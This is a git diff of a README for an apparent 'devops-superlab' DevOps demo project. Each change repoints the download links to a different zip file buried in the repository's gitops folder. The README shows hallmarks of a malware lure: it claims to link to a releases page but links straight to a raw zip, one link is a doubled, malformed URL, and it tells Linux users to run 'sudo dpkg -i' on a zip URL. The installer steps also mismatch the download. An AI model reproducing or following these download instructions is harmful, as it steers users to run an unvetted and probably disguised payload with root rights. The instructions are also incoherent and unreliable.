@@ -1,6 +1,6 @@
 # 🚀 devops-superlab - Effortless Setup for DevOps Demos
 
-[![Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip%https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip)](https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip%https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip)](https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip)
 
 ## 📥 Overview
 
@@ -31,7 +31,7 @@ To set up DevOps SuperLab on your machine, follow the steps below.
 
 1. **Visit the Download Page**: Click the link below to access our Releases page.
    
-   [Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip)
 
 2. **Choose the Right File**: On the Releases page, find the latest version. Look for files appropriate for your operating system. 
 
@@ -40,7 +40,7 @@ To set up DevOps SuperLab on your machine, follow the steps below.
 4. **Run the Installer**: Once the file is downloaded:
    - On **Windows**: Double-click the `.exe` file to start the installation.
    - On **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - On **Linux**: Use your terminal to navigate to the download location and run the installation command, typically `sudo dpkg -i https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip`.
+   - On **Linux**: Use your terminal to navigate to the download location and run the installation command, typically `sudo dpkg -i https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip`.
 
 5. **Follow Setup Instructions**: Complete the setup by following the prompts provided by the installer.
 
@@ -52,7 +52,7 @@ To set up DevOps SuperLab on your machine, follow the steps below.
 
 For a smooth installation experience, return to the Releases page to download anywhere from the latest version of DevOps SuperLab based on your operating system.
 
-[Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/Londres/devops-superlab.zip)
+[Download Latest Release](https://raw.githubusercontent.com/marechan1/devops-superlab/main/gitops/argocd/apps/superlab_devops_v1.3.zip)
 
 ## 🛠️ Additional Resources
 
